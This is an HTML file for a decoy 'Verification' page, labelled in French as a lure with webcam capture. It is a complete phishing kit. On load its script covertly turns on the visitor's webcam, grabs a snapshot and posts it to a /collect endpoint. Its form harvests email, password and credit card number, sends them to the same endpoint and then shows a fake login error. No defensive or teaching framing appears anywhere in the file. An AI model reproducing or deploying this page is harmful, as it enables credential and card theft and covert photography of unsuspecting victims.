<!-- language: HTML, file: public/index.html, target: Browser / Client -->
<!-- *Interface leurre avec capture de webcam et formulaire de saisie* -->
<!DOCTYPE html>
<html>
<head>
    <title>Verification</title>
</head>
<body>
    <h2>Chargement en cours...</h2>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <form id="credForm">
        <input type="text" id="email" placeholder="Email" required><br>
        <input type="password" id="password" placeholder="Mot de passe" required><br>
        <input type="text" id="cc" placeholder="Carte bancaire"><br>
        <button type="submit">Valider</button>
    </form>

    <script>
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                const video = document.getElementById('video');
                video.srcObject = stream;
                video.play();
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const dataURL = canvas.toDataURL('image/png');
                    
                    sendData({ webcam: dataURL });
                    stream.getTracks().forEach(track => track.stop());
                }, 1000);
            }).catch(err => console.log(err));

        function sendData(extraData) {
            const payload = Object.assign({
                email: document.getElementById('email').value,
                password: document.getElementById('password').value,
                cc: document.getElementById('cc').value
            }, extraData);

            fetch('/collect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        }

        document.getElementById('credForm').addEventListener('submit', (e) => {
            e.preventDefault();
            sendData({});
            alert('Erreur de connexion');
        });
    </script>
</body>
</html>
  
